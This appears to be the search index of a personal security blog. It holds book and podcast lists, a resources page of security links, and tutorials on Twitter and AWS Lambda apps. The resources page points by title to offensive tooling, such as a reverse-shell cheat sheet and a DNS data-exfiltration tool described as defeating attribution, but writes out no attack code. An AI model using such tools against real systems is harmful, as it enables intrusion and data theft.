{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"\u00b6 Latest Posts \u00b6 Posts Description Date KringleCon 3 This years KringleCon conference was full of exciting challenges and amazing talks. This guide will walk you through the objectives and terminal challenges for this conference. 2021-01-11 Migrating Blog from Jekyll to MkDocs on GitHub Pages Getting bored with your blog layout? Looking to get it more organized with a snappy side bar and a cool search option? 2021-01-08 KringleCon 2 Every year around the holidays SAN releases their CTF Holiday Hack challenge. These Holiday Hack challenges consists of a story and a mystery that revolve around the holidays and Santa. This write-up will provide a walkthrough of the Holiday Hack Challenge. It includes a walkthrough of each objectives and terminal challenge. It will also provide inspiring quotes, hints and strategies on solving future challenges. 2020-01-13 How to Deobfuscate JavaScript It's the weekend and you ran out of things to do? Why don't you try deobfuscating this malicious Javascript! 2019-06-16 How to Sign Up for Hack The Box Bored? Want to keep your skills fresh or learn a few more? Check out Hack The Box Pen-Testing Labs! 2019-04-22","title":"Home"},{"location":"#_1","text":"","title":""},{"location":"#latest-posts","text":"Posts Description Date KringleCon 3 This years KringleCon conference was full of exciting challenges and amazing talks. This guide will walk you through the objectives and terminal challenges for this conference. 2021-01-11 Migrating Blog from Jekyll to MkDocs on GitHub Pages Getting bored with your blog layout? Looking to get it more organized with a snappy side bar and a cool search option? 2021-01-08 KringleCon 2 Every year around the holidays SAN releases their CTF Holiday Hack challenge. These Holiday Hack challenges consists of a story and a mystery that revolve around the holidays and Santa. This write-up will provide a walkthrough of the Holiday Hack Challenge. It includes a walkthrough of each objectives and terminal challenge. It will also provide inspiring quotes, hints and strategies on solving future challenges. 2020-01-13 How to Deobfuscate JavaScript It's the weekend and you ran out of things to do? Why don't you try deobfuscating this malicious Javascript! 2019-06-16 How to Sign Up for Hack The Box Bored? Want to keep your skills fresh or learn a few more? Check out Hack The Box Pen-Testing Labs! 2019-04-22","title":"Latest Posts"},{"location":"about/","text":"About Me \u00b6 I am Mo . Enough about me!!! Hope you're enjoying the blog.","title":"About"},{"location":"about/#about-me","text":"I am Mo . Enough about me!!! Hope you're enjoying the blog.","title":"About Me"},{"location":"books/","text":"Here are some good books to read when you're bored: Biographies \u00b6 The 50 th Law by 50 Cent and Robert Greene Long Walk to Freedom by Nelson Mandela Ghost in the Wires by Kevin Mitnick Open: An Autobiography by Andre Agassi Brain on Fire by Susannah Cahalan The Elephant Whisperer by Lawrence Anthony and Graham Spence Business & Money \u00b6 The 48 th Laws of Power by Robert Greene Influence by Robert B. Cialdini Algorithms to Live By by Brian Christian and Tom Griffiths The Richest Man in Babylon by George S. Clason A Random Walk Down Wall Street by Burton G. Malkiel The Signal and the Noise by Nate Silver Think and Grow Rich by Napoleon Hill The 33 Strategies of War by Robert Greene End This Depression Now! by Paul Krugman Business Adventures by John Brooks Rich Dad Poor Dad by Robert T. Kiyosaki Freakonomics by Steven D. Levitt and Stephen J. Dubner Eat that Frog! Brian Tracy The Charisma Myth by Olivia Fox Cabane The Black Swan by Nassim Nicholas Taleb 7 Strategies for Wealth & Happiness by Jim Rohn Golden Rules for Making Money by P. T. Barnum Communication & Social Skills \u00b6 Verbal Judo by George J. Thompson How to Talk to Anyone by Leil Lowndes The Art of Storytelling by Great Courses The Like Switch by Marvin Karlins and Jack Schafer Health \u00b6 How Not to Die by Michael Greger, Gene Stone History \u00b6 The Lessons of History by Will, Ariel Durant Sapiens by Yuval Noah Harari Literature & Fiction \u00b6 1Q84 by Haruki Murakami Meditation \u00b6 Practicing Mindfulness by the Great Courses Motivational \u00b6 The Obstacle in the Way by Ryan Holiday The Untethered Soul by Michael A. Singer The fifth Agreement by Don Miguel Ruiz Nudge by Richard H. Thaler and Cass R. Sunstein Deep Work by Cal Newport Parenting \u00b6 How to Talk So Kids Will Listen & Listen So Kids Will Talk by Adele Faber and Elaine Mazlish Philosophy \u00b6 The Art of Living by Epictetus Man's Search for Meaning by Viktor E. Frankl The Happiness Hypothesis by Jonathan Haidt The Drunkard's Walk: How Randomness Rules Our Lives by Leonard Mlodinow A Guide to the Good Life by William B. Irvine Meditations by Marcus Aurelius Antifragile by Nassim Nicholas Taleb Politics & Social Sciences \u00b6 Them: Adventures with Extremists by Jon Ronson Mastery by Robert Greene How to Read a Book by Mortimer J. Adler and Charles Van Doren Art of Being by Erich Fromm Psychology \u00b6 Blink by Malcolm Gladwell Predictably Irrational by Dan Ariely Emotional Intelligence by Daniel Goleman The Willpower Instinct by Kelly McGonigal Without Conscience by Robert D. Hare David and Goliath by Malcolm Gladwell Thinking, Fast and Slow by Daniel Kahneman The War of Art by Steven Pressfield Relationship \u00b6 The Five Love Languages by Gary Chapman Science & Math \u00b6 What if? by Randall Munroe The Selfish Gene by Richard Dawkins Sociology \u00b6 The Psychopath Test by Jon Ronson The Hero with a Thousand Faces by Joseph Campbell Abundance by Steven Kotler and Peter H. Diamandis Outliers by Malcolm Gladwell Spirituality \u00b6 Fear by Thich Nhat Hanh The Power of Now by Eckhart Tolle","title":"Books"},{"location":"books/#biographies","text":"The 50 th Law by 50 Cent and Robert Greene Long Walk to Freedom by Nelson Mandela Ghost in the Wires by Kevin Mitnick Open: An Autobiography by Andre Agassi Brain on Fire by Susannah Cahalan The Elephant Whisperer by Lawrence Anthony and Graham Spence","title":"Biographies"},{"location":"books/#business-money","text":"The 48 th Laws of Power by Robert Greene Influence by Robert B. Cialdini Algorithms to Live By by Brian Christian and Tom Griffiths The Richest Man in Babylon by George S. Clason A Random Walk Down Wall Street by Burton G. Malkiel The Signal and the Noise by Nate Silver Think and Grow Rich by Napoleon Hill The 33 Strategies of War by Robert Greene End This Depression Now! by Paul Krugman Business Adventures by John Brooks Rich Dad Poor Dad by Robert T. Kiyosaki Freakonomics by Steven D. Levitt and Stephen J. Dubner Eat that Frog! Brian Tracy The Charisma Myth by Olivia Fox Cabane The Black Swan by Nassim Nicholas Taleb 7 Strategies for Wealth & Happiness by Jim Rohn Golden Rules for Making Money by P. T. Barnum","title":"Business &amp; Money"},{"location":"books/#communication-social-skills","text":"Verbal Judo by George J. Thompson How to Talk to Anyone by Leil Lowndes The Art of Storytelling by Great Courses The Like Switch by Marvin Karlins and Jack Schafer","title":"Communication &amp; Social Skills"},{"location":"books/#health","text":"How Not to Die by Michael Greger, Gene Stone","title":"Health"},{"location":"books/#history","text":"The Lessons of History by Will, Ariel Durant Sapiens by Yuval Noah Harari","title":"History"},{"location":"books/#literature-fiction","text":"1Q84 by Haruki Murakami","title":"Literature &amp; Fiction"},{"location":"books/#meditation","text":"Practicing Mindfulness by the Great Courses","title":"Meditation"},{"location":"books/#motivational","text":"The Obstacle in the Way by Ryan Holiday The Untethered Soul by Michael A. Singer The fifth Agreement by Don Miguel Ruiz Nudge by Richard H. Thaler and Cass R. Sunstein Deep Work by Cal Newport","title":"Motivational"},{"location":"books/#parenting","text":"How to Talk So Kids Will Listen & Listen So Kids Will Talk by Adele Faber and Elaine Mazlish","title":"Parenting"},{"location":"books/#philosophy","text":"The Art of Living by Epictetus Man's Search for Meaning by Viktor E. Frankl The Happiness Hypothesis by Jonathan Haidt The Drunkard's Walk: How Randomness Rules Our Lives by Leonard Mlodinow A Guide to the Good Life by William B. Irvine Meditations by Marcus Aurelius Antifragile by Nassim Nicholas Taleb","title":"Philosophy"},{"location":"books/#politics-social-sciences","text":"Them: Adventures with Extremists by Jon Ronson Mastery by Robert Greene How to Read a Book by Mortimer J. Adler and Charles Van Doren Art of Being by Erich Fromm","title":"Politics &amp; Social Sciences"},{"location":"books/#psychology","text":"Blink by Malcolm Gladwell Predictably Irrational by Dan Ariely Emotional Intelligence by Daniel Goleman The Willpower Instinct by Kelly McGonigal Without Conscience by Robert D. Hare David and Goliath by Malcolm Gladwell Thinking, Fast and Slow by Daniel Kahneman The War of Art by Steven Pressfield","title":"Psychology"},{"location":"books/#relationship","text":"The Five Love Languages by Gary Chapman","title":"Relationship"},{"location":"books/#science-math","text":"What if? by Randall Munroe The Selfish Gene by Richard Dawkins","title":"Science &amp; Math"},{"location":"books/#sociology","text":"The Psychopath Test by Jon Ronson The Hero with a Thousand Faces by Joseph Campbell Abundance by Steven Kotler and Peter H. Diamandis Outliers by Malcolm Gladwell","title":"Sociology"},{"location":"books/#spirituality","text":"Fear by Thich Nhat Hanh The Power of Now by Eckhart Tolle","title":"Spirituality"},{"location":"podcasts/","text":"Here are some of my favourite Podcasts: Cybersecurity \u00b6 Darknet Diaries Malicious Life Security Now Spycast The Privacy, Security & OSINT Show Economics \u00b6 Behind the Markets Podcast Odd Lots NPR Indicator General \u00b6 99% Invisible Cautionary Tales Exponential Wisdom Lex Fridman Making Sense Radiolab The 80,000 Hours Podcast with Rob Wiblin The a16z Podcast The Joe Rogan Experience Think Again - a Big Think Podcast Why Is This Happening? History \u00b6 Dan Carlin's Hardcore History Revisionist History Personal Improvement \u00b6 The Jordan harbinger Show The Tim Ferriss Show The Tony Robbins Podcast Psychology \u00b6 Hidden Brain Rationality: From AI to Zombies - The Podcast Ten Percent Happier Podcast with Dan Harris Science \u00b6 Startalk Radio Spirituality \u00b6 Oprah\u2019s SuperSoul Conversations Ram Dass Here and Now Startups \u00b6 Indie Hackers Startup for the rest of us","title":"Podcasts"},{"location":"podcasts/#cybersecurity","text":"Darknet Diaries Malicious Life Security Now Spycast The Privacy, Security & OSINT Show","title":"Cybersecurity"},{"location":"podcasts/#economics","text":"Behind the Markets Podcast Odd Lots NPR Indicator","title":"Economics"},{"location":"podcasts/#general","text":"99% Invisible Cautionary Tales Exponential Wisdom Lex Fridman Making Sense Radiolab The 80,000 Hours Podcast with Rob Wiblin The a16z Podcast The Joe Rogan Experience Think Again - a Big Think Podcast Why Is This Happening?","title":"General"},{"location":"podcasts/#history","text":"Dan Carlin's Hardcore History Revisionist History","title":"History"},{"location":"podcasts/#personal-improvement","text":"The Jordan harbinger Show The Tim Ferriss Show The Tony Robbins Podcast","title":"Personal Improvement"},{"location":"podcasts/#psychology","text":"Hidden Brain Rationality: From AI to Zombies - The Podcast Ten Percent Happier Podcast with Dan Harris","title":"Psychology"},{"location":"podcasts/#science","text":"Startalk Radio","title":"Science"},{"location":"podcasts/#spirituality","text":"Oprah\u2019s SuperSoul Conversations Ram Dass Here and Now","title":"Spirituality"},{"location":"podcasts/#startups","text":"Indie Hackers Startup for the rest of us","title":"Startups"},{"location":"resources/","text":"AI/Machine Learning \u00b6 CS224n: Natural Language Processing with Deep Learning or Youtube Link Best of Machine Learning Interactive Machine Learning List : A collaborative list of interactive Machine Learning, Deep Learning and Statistics websites AWS Machine Learning Training Dive into Deep Learning OpenAI Resources Andrew Ng Machine Learning Cybersecurity \u00b6 Blogs \u00b6 Krebs on Security Didier Stevens Daniel Miessler Lenny Zeltser : A lot of good content and information on Lenny's Blog. Schneier on Security Graham Clueley Troy Hunt Trail of Bits Black Hills CIS Center for Internet Security : Career \u00b6 How to Build a Successful Career in Information Security / Cybersecurity Tips for Getting the Right IT Job Zeltser Career Development Getting Started with CyberSecurity Cheat Sheets \u00b6 Reverse Shell Cheat Sheet Cloud \u00b6 Security Assessments \u00b6 Azucar : is a multi-threaded plugin-based tool to help assess the security of Azure Cloud environment subscriptions. How to Secure and Audit an Amazon Web Services Three-tier Web Architecture CTF \u00b6 Hack The Box Vulnerable By Design Hack This Site! PentesterLab Hack.me Hone your Ninja skills in Cyber Security DFIR SANs Challenges DFIR Challenges 1 DFIR Challenges 2 DFIR Challenges 3 DFIR Challenges 4 Dev \u00b6 Finding Secrets in Code \u00b6 TruffleHog : Find secret keys in code Git All Secrets DFIR \u00b6 DFIR Articles \u00b6 Windows Events log for IR/Forensics : Logon Event IDs Tools for DFIR \u00b6 KAPE Kansa PSRecon Invoke-IR Windows Incident Response Tools Open Source Forensic Tools OSINT \u00b6 OSINT Framework Maltego PenTesting \u00b6 PacketWhisper : Stealthily exfiltrate data and defeat attribution using DNS queries and text-based stenography. Exfiltrating data from (very) isolated environments : Powershell Empire - Post Exploitation Framework The Easiest Metasploit Guide You\u2019ll Ever Read PE Tricks \u00b6 Windows Exploitation Tricks: Exploiting Arbitrary File Writes for Local Elevation of Privilege Upgrading simple shells to fully interactive TTYs Podcasts \u00b6 SANS StormCast Security Now! Digital Forensic Survival Podcast Skill Assessment \u00b6 Security Esstials Placement Assessment : The Assessment provides data and insights into Information Security Foundations, Cornerstone Information Security and Advanced Information Security Principles. Reverse Engineering Malware \u00b6 Decoding/Encoding \u00b6 CyberChef : Swiss Army knife of decoding and transforming data. Education \u00b6 Reverse Engineering for Beginners Assembly Language for Beginners Wasm Reverse Engineering SANS Pen Testing Training SANS Digital Forensics and Incident Response Shortcuts for Understanding Malicious Scripts File Analysis \u00b6 Flash Analysis \u00b6 FLASHMINGO or Here : This is the flash analysis tool from FireEye SWFTools : SWFTools (to dump ActionScript code use swfdump -Ddu blah.txt) SWFREtools Adobe SWF Investigator JS Analysis \u00b6 Beautify JS \u00b6 JS Beautifier JavaScript Beautifier JS Beautify Create Flowchart for JS Analysis \u00b6 JS-file box-js SpriderMonkey Rhino-Debugger JSUNPACK-N / Firebug Office files \u00b6 Office password encrypted master password Ransomware \u00b6 ID Ransomware : ID Ransomware No More Ransome! : Helps unlock files without paying attackers. Malicious Websites Lookup \u00b6 Talos Intelligence : Reputation lookup MXToolBox : Blacklists Lookup URL Query : Detect and analyze web-based malware URL Scan : Detect and analyze web-based malware Network \u00b6 Snort \u00b6 3.5 Payload Detection Rule Options Snort: \u201cbyte_test\u201d for dummies Packet Mining for Privacy Leakage Yara \u00b6 Yara Rules Sandbox / Dynamic Analysis \u00b6 JoeSandbox VirusTotal Education \u00b6 MOC Courses \u00b6 TOP MOC Courses Learn How to Learn Misc \u00b6 Teach Yourself Programming in Ten Years by Peter Norvig The Book Of Secret Knowledge Awesome Interesting Articles \u00b6 How to Find Hidden Cameras in your AirBNB List of Common Misconceptions List of Lists List of Unusual Articles Longevity FAQ: A beginner's guide to longevity research Interesting Online Tools \u00b6 The Paleobiology Database Gap Minder Interesting Videos \u00b6 How to Take Charge of Your Life - Jim Rohn Personal Development The Need for a Paradigm Shift in Safety and Cyber Security : by Nancy Leveson, Professor of Aeronautics and Astronautics and Engineering Systems, MIT. Cyber Resilient Energy Delivery Consortium (CREDC). She has written the book \"Engineering a Safer World\" which is available online for free . Life Blogs \u00b6 Paul Graham LessWrong Wiki","title":"Resources"},{"location":"resources/#aimachine-learning","text":"CS224n: Natural Language Processing with Deep Learning or Youtube Link Best of Machine Learning Interactive Machine Learning List : A collaborative list of interactive Machine Learning, Deep Learning and Statistics websites AWS Machine Learning Training Dive into Deep Learning OpenAI Resources Andrew Ng Machine Learning","title":"AI/Machine Learning"},{"location":"resources/#cybersecurity","text":"","title":"Cybersecurity"},{"location":"resources/#blogs","text":"Krebs on Security Didier Stevens Daniel Miessler Lenny Zeltser : A lot of good content and information on Lenny's Blog. Schneier on Security Graham Clueley Troy Hunt Trail of Bits Black Hills CIS Center for Internet Security :","title":"Blogs"},{"location":"resources/#career","text":"How to Build a Successful Career in Information Security / Cybersecurity Tips for Getting the Right IT Job Zeltser Career Development Getting Started with CyberSecurity","title":"Career"},{"location":"resources/#cheat-sheets","text":"Reverse Shell Cheat Sheet","title":"Cheat Sheets"},{"location":"resources/#cloud","text":"","title":"Cloud"},{"location":"resources/#security-assessments","text":"Azucar : is a multi-threaded plugin-based tool to help assess the security of Azure Cloud environment subscriptions. How to Secure and Audit an Amazon Web Services Three-tier Web Architecture","title":"Security Assessments"},{"location":"resources/#ctf","text":"Hack The Box Vulnerable By Design Hack This Site! PentesterLab Hack.me Hone your Ninja skills in Cyber Security DFIR SANs Challenges DFIR Challenges 1 DFIR Challenges 2 DFIR Challenges 3 DFIR Challenges 4","title":"CTF"},{"location":"resources/#dev","text":"","title":"Dev"},{"location":"resources/#finding-secrets-in-code","text":"TruffleHog : Find secret keys in code Git All Secrets","title":"Finding Secrets in Code"},{"location":"resources/#dfir","text":"","title":"DFIR"},{"location":"resources/#dfir-articles","text":"Windows Events log for IR/Forensics : Logon Event IDs","title":"DFIR Articles"},{"location":"resources/#tools-for-dfir","text":"KAPE Kansa PSRecon Invoke-IR Windows Incident Response Tools Open Source Forensic Tools","title":"Tools for DFIR"},{"location":"resources/#osint","text":"OSINT Framework Maltego","title":"OSINT"},{"location":"resources/#pentesting","text":"PacketWhisper : Stealthily exfiltrate data and defeat attribution using DNS queries and text-based stenography. Exfiltrating data from (very) isolated environments : Powershell Empire - Post Exploitation Framework The Easiest Metasploit Guide You\u2019ll Ever Read","title":"PenTesting"},{"location":"resources/#pe-tricks","text":"Windows Exploitation Tricks: Exploiting Arbitrary File Writes for Local Elevation of Privilege Upgrading simple shells to fully interactive TTYs","title":"PE Tricks"},{"location":"resources/#podcasts","text":"SANS StormCast Security Now! Digital Forensic Survival Podcast","title":"Podcasts"},{"location":"resources/#skill-assessment","text":"Security Esstials Placement Assessment : The Assessment provides data and insights into Information Security Foundations, Cornerstone Information Security and Advanced Information Security Principles.","title":"Skill Assessment"},{"location":"resources/#reverse-engineering-malware","text":"","title":"Reverse Engineering Malware"},{"location":"resources/#decodingencoding","text":"CyberChef : Swiss Army knife of decoding and transforming data.","title":"Decoding/Encoding"},{"location":"resources/#education","text":"Reverse Engineering for Beginners Assembly Language for Beginners Wasm Reverse Engineering SANS Pen Testing Training SANS Digital Forensics and Incident Response Shortcuts for Understanding Malicious Scripts","title":"Education"},{"location":"resources/#file-analysis","text":"","title":"File Analysis"},{"location":"resources/#flash-analysis","text":"FLASHMINGO or Here : This is the flash analysis tool from FireEye SWFTools : SWFTools (to dump ActionScript code use swfdump -Ddu blah.txt) SWFREtools Adobe SWF Investigator","title":"Flash Analysis"},{"location":"resources/#js-analysis","text":"","title":"JS Analysis"},{"location":"resources/#beautify-js","text":"JS Beautifier JavaScript Beautifier JS Beautify Create Flowchart for JS","title":"Beautify JS"},{"location":"resources/#analysis","text":"JS-file box-js SpriderMonkey Rhino-Debugger JSUNPACK-N / Firebug","title":"Analysis"},{"location":"resources/#office-files","text":"Office password encrypted master password","title":"Office files"},{"location":"resources/#ransomware","text":"ID Ransomware : ID Ransomware No More Ransome! : Helps unlock files without paying attackers.","title":"Ransomware"},{"location":"resources/#malicious-websites-lookup","text":"Talos Intelligence : Reputation lookup MXToolBox : Blacklists Lookup URL Query : Detect and analyze web-based malware URL Scan : Detect and analyze web-based malware","title":"Malicious Websites Lookup"},{"location":"resources/#network","text":"","title":"Network"},{"location":"resources/#snort","text":"3.5 Payload Detection Rule Options Snort: \u201cbyte_test\u201d for dummies Packet Mining for Privacy Leakage","title":"Snort"},{"location":"resources/#yara","text":"Yara Rules","title":"Yara"},{"location":"resources/#sandbox-dynamic-analysis","text":"JoeSandbox VirusTotal","title":"Sandbox / Dynamic Analysis"},{"location":"resources/#education_1","text":"","title":"Education"},{"location":"resources/#moc-courses","text":"TOP MOC Courses Learn How to Learn","title":"MOC Courses"},{"location":"resources/#misc","text":"Teach Yourself Programming in Ten Years by Peter Norvig The Book Of Secret Knowledge Awesome","title":"Misc"},{"location":"resources/#interesting-articles","text":"How to Find Hidden Cameras in your AirBNB List of Common Misconceptions List of Lists List of Unusual Articles Longevity FAQ: A beginner's guide to longevity research","title":"Interesting Articles"},{"location":"resources/#interesting-online-tools","text":"The Paleobiology Database Gap Minder","title":"Interesting Online Tools"},{"location":"resources/#interesting-videos","text":"How to Take Charge of Your Life - Jim Rohn Personal Development The Need for a Paradigm Shift in Safety and Cyber Security : by Nancy Leveson, Professor of Aeronautics and Astronautics and Engineering Systems, MIT. Cyber Resilient Energy Delivery Consortium (CREDC). She has written the book \"Engineering a Safer World\" which is available online for free .","title":"Interesting Videos"},{"location":"resources/#life-blogs","text":"Paul Graham LessWrong Wiki","title":"Life Blogs"},{"location":"posts/2018/post1/2018-11-03-HowToCreateATwitterApp/","text":"Apply for Access Introduction \u00b6 This article will walk you through the steps to create a simple Twitter App using Python. Requirements \u00b6 Prior to creating a Twitter App, you will need the following: Python 3.6 or later installed A Twitter Account Instructions \u00b6 The process to create a Twitter App is broken down into the following steps: Step 1 - Apply for a Developer Account Step 2 - Create an App in Twitter Step 3 - Create Keys and Tokens for your App Step 4 - Install Python-Twitter Library Step 5 - Create a Python Script that Posts to Twitter Step 1 - Apply for a Developer Account \u00b6 You need to apply for a developer account through Twitter. To do this, log in to Twitter and visit https://developer.twitter.com/ If this is your first time to log in to the above link, you would see something like this: Apply for Access Click on 'Apply for a Developer Account'. Application for Developer Account Review the instructions on the page. Once ready to proceed, press on 'Continue'. You will be asked some additional questions in regards to the developer account. You will need to complete 'Account Details' and 'Use case details'. You will see something like this once you have answered all the questions and agreed to the Terms of Service. Confirmation Screen Step 2 - Create an App in Twitter\ufeff \u00b6 At this point, you've signed up for a Twitter Developer Account, confirmed you're email address and you're on the 'Get Started' Page. 'Get Started' Page Click on 'Create an App' under 'Get started'. You should see something like this: Create an app Click on ' Create an app' again. You will be asked to fill out some information in regards to your app (similar to filling out the developer questionnaire). Here are some of the details you will have to fill out: App questionnaire Complete the questionnaire to create your app. Step 3 - Create Keys and Tokens for your App \u00b6 Now that you've created your Twitter App. You will see something like this: App details Click on 'Keys and tokens'. The Consumer API keys will be listed. You will need also need to 'Create' the 'Access token & access token secret' for your App. App Keys and Tokens Step 4 - Install Python-Twitter Library \u00b6 This step will walk you through installing the Python-Twitter Library. You will need to download the library from github.com. Python-Twitter Library Link: https://github.com/bear/python-twitter Screenshot of Python-Twitter github library Download and extract the library. Run the following command to install the library: python setup.py install\ufeff The first time I tired to install the library, I got the following error message: error: The 'requests' distribution was not found and is required by python-twitter Screenshot of the installation error Running the install command again resolved the issue. Step 5 - Create a Python Script that Posts to Twitter \u00b6 I know it's been fun, however we're almost at the end. Now time to write a simple Python program that makes a post to Twitter. Make sure to import twitter at top of your program: import twitter Authenticate to Twitter by using your token, token secret, consumer_key and consumer_secret (from Step 3). api = twitter . Api ( consumer_key = consumer_key , consumer_secret = consumer_secret , access_token_key = token , access_token_secret = token_secret ) Update your status with the following syntax: status = api . PostUpdate ( \"Hello World #HelloWorld #Python #TwitterApp\" ) Summary \u00b6 Voila!! You've just sent a tweet!! Go check you're Twitter!! You've made your first Twitter app with Python!! This article provided the minimum steps required to create a Twitter App. I know what you're thinking, this is a good start, but running a Python script to send a tweet still sounds like too much work. In a future post I will show you how to use AWS lambda to make this more efficient and self reliant.","title":"How to Create a Twitter App"},{"location":"posts/2018/post1/2018-11-03-HowToCreateATwitterApp/#introduction","text":"This article will walk you through the steps to create a simple Twitter App using Python.","title":"Introduction"},{"location":"posts/2018/post1/2018-11-03-HowToCreateATwitterApp/#requirements","text":"Prior to creating a Twitter App, you will need the following: Python 3.6 or later installed A Twitter Account","title":"Requirements"},{"location":"posts/2018/post1/2018-11-03-HowToCreateATwitterApp/#instructions","text":"The process to create a Twitter App is broken down into the following steps: Step 1 - Apply for a Developer Account Step 2 - Create an App in Twitter Step 3 - Create Keys and Tokens for your App Step 4 - Install Python-Twitter Library Step 5 - Create a Python Script that Posts to Twitter","title":"Instructions"},{"location":"posts/2018/post1/2018-11-03-HowToCreateATwitterApp/#step-1-apply-for-a-developer-account","text":"You need to apply for a developer account through Twitter. To do this, log in to Twitter and visit https://developer.twitter.com/ If this is your first time to log in to the above link, you would see something like this: Apply for Access Click on 'Apply for a Developer Account'. Application for Developer Account Review the instructions on the page. Once ready to proceed, press on 'Continue'. You will be asked some additional questions in regards to the developer account. You will need to complete 'Account Details' and 'Use case details'. You will see something like this once you have answered all the questions and agreed to the Terms of Service. Confirmation Screen","title":"Step 1 - Apply for a Developer Account"},{"location":"posts/2018/post1/2018-11-03-HowToCreateATwitterApp/#step-2-create-an-app-in-twitter","text":"At this point, you've signed up for a Twitter Developer Account, confirmed you're email address and you're on the 'Get Started' Page. 'Get Started' Page Click on 'Create an App' under 'Get started'. You should see something like this: Create an app Click on ' Create an app' again. You will be asked to fill out some information in regards to your app (similar to filling out the developer questionnaire). Here are some of the details you will have to fill out: App questionnaire Complete the questionnaire to create your app.","title":"Step 2 - Create an App in Twitter\ufeff"},{"location":"posts/2018/post1/2018-11-03-HowToCreateATwitterApp/#step-3-create-keys-and-tokens-for-your-app","text":"Now that you've created your Twitter App. You will see something like this: App details Click on 'Keys and tokens'. The Consumer API keys will be listed. You will need also need to 'Create' the 'Access token & access token secret' for your App. App Keys and Tokens","title":"Step 3 - Create Keys and Tokens for your App"},{"location":"posts/2018/post1/2018-11-03-HowToCreateATwitterApp/#step-4-install-python-twitter-library","text":"This step will walk you through installing the Python-Twitter Library. You will need to download the library from github.com. Python-Twitter Library Link: https://github.com/bear/python-twitter Screenshot of Python-Twitter github library Download and extract the library. Run the following command to install the library: python setup.py install\ufeff The first time I tired to install the library, I got the following error message: error: The 'requests' distribution was not found and is required by python-twitter Screenshot of the installation error Running the install command again resolved the issue.","title":"Step 4 - Install Python-Twitter Library"},{"location":"posts/2018/post1/2018-11-03-HowToCreateATwitterApp/#step-5-create-a-python-script-that-posts-to-twitter","text":"I know it's been fun, however we're almost at the end. Now time to write a simple Python program that makes a post to Twitter. Make sure to import twitter at top of your program: import twitter Authenticate to Twitter by using your token, token secret, consumer_key and consumer_secret (from Step 3). api = twitter . Api ( consumer_key = consumer_key , consumer_secret = consumer_secret , access_token_key = token , access_token_secret = token_secret ) Update your status with the following syntax: status = api . PostUpdate ( \"Hello World #HelloWorld #Python #TwitterApp\" )","title":"Step 5 - Create a Python Script that Posts to Twitter"},{"location":"posts/2018/post1/2018-11-03-HowToCreateATwitterApp/#summary","text":"Voila!! You've just sent a tweet!! Go check you're Twitter!! You've made your first Twitter app with Python!! This article provided the minimum steps required to create a Twitter App. I know what you're thinking, this is a good start, but running a Python script to send a tweet still sounds like too much work. In a future post I will show you how to use AWS lambda to make this more efficient and self reliant.","title":"Summary"},{"location":"posts/2018/post2/2018-11-12-HowToCreateAnAWSLambdaFunction/","text":"AWS Lambda Introduction \u00b6 This article will walk you through how to create an AWS Lambda Function. An AWS Lambda Function consists of a Trigger, Function and Resources.The Trigger will be generated based on an event. An example of an event that is a 'CloudWatch Event'. The 'CloudWatch Event' can be configured to generate a trigger based on a specified schedule. The Function will be executed once an event is triggered. We will go into more details later. Designer Window The function can be written in different programming languages. Here is a list of these languages: AWS Lambda Runtime Frameworks Instructions \u00b6 The process to create a Lambda Function is broken down into the following steps: Step 1 - AWS Account Overview Step 2 - Create a Lambda Function Step 3 - Add Trigger from 'CloudWatch Event' Step 4 - Create the Handler Function Step 5 - Zip your Code and Upload it Step 6 - Configure Test Event and Test Step 1 - AWS Account Overview \u00b6 You will need to sign up for an AWS Account. The sign up process will require you to enter Credit Card information. There are different tiers for an AWS account. With the 'Free Tier' you can run 1M Requests per Month and 400,000 GB-seconds of compute time per month. Links: Console AWS AWS Lambda Pricing Step 2 - Create a Lambda Function \u00b6 Now that you've signed up for an AWS account, you're ready to create a Lambda function. From 'Services' Menu select 'Lambda'. AWS Services Click on ' Create a function'. Select 'Author from scratch'. Create a Function 1 Fill in the 'Name' of the function, Runtime, Role and Role Name. Create a Function 2 Roles are created based on the permissions that you want to grant to your AWS Lambda function. AWS Lambda Permissions Model can be reviewed at https://docs.aws.amazon.com/lambda/latest/dg/intro-permission-model.html#lambda-intro-execution-role Step 3 - Add Trigger from 'CloudWatch Event' \u00b6 Once you created your function, you will see something like this. Click on 'CloudWatch Events' on the left tool bar. Create a Function 2 Configure the trigger by configuring a new Rule. You can use cron or rate expressions to configure the rule. Here the rule is configured with cron (0 13 * * ? *) to run daily at 13:00 GMT. Link for additional details on Cron Expressions: Cron Expressions Creating a Trigger Save your function after configuring the Trigger Rule. You will see something like this: Cron Expression Trigger Step 4 - Create the Handler Function \u00b6 Your code needs to contain a lambda event handler. The name of the event handler function needs to be configured in the AWS Web GUI. This is shown below: Lambda Handler Function The code for the event handler looks something like this: import json def lambda_handler ( event , context ): # TODO implement return { 'statusCode' : 200 , 'body' : json . dumps ( 'Hello from Lambda!' ) } Your code will need to include a handler similar to above. The #ToDo implement can be replaced with main(), if you have a main() function defined in your code. Step 5 - Zip your Code and Upload it \u00b6 Now that your code is ready. There is one more step prior to creating a zip file. Any 3 rd party libraries that your code imports needs to be included in the .zip file. For example, if your code imports Python-twitter libraries, you will need to install the libraries in the code directory. This can be done with the following command executed from your code directory: Windows: pip install python-twitter -t . Linux: pip instaall python-twitter -t $(pwd) After the code directory includes all the 3 rd party libraries and the code, you need to create a .zip file that includes everything. The .zip file may look something like this. Lambda Function .zip File Now upload the .zip file to the Lambda function. Upload .zip File Step 6 - Configure Test Event and Test \u00b6 Now you have created a trigger and uploaded your code, you're ready for testing. Click on 'Test' button to create a test event. Test Here is how the test event creation may look like: Create Test Event You can configure the test event based on the scenario you want to test. If your code doesn't require any input parameters, you can click on 'Create' to test your code. Make sure to 'Save' your function periodically. Summary \u00b6 You're done!!! Good Job, you've created a lambda function. Here are some things that you might of done if you followed through with the article: Setup and configured your 'free tier' AWS account. Created an AWS Lambda Function. Added a 'CloudWatch Event' to trigger your function once a day. Added an event handler function to your code to handle the trigger from the 'CloudWatch Event'. Installed 3 rd party libraries in your code directory. Created a .zip archive for your code and uploaded it. Created a Test event to test out your code. In a future article I'll touch base on how to do this with AWS SAM (Serverless Application Model) CLI.","title":"How to Create an AWS Lambda Function"},{"location":"posts/2018/post2/2018-11-12-HowToCreateAnAWSLambdaFunction/#introduction","text":"This article will walk you through how to create an AWS Lambda Function. An AWS Lambda Function consists of a Trigger, Function and Resources.The Trigger will be generated based on an event. An example of an event that is a 'CloudWatch Event'. The 'CloudWatch Event' can be configured to generate a trigger based on a specified schedule. The Function will be executed once an event is triggered. We will go into more details later. Designer Window The function can be 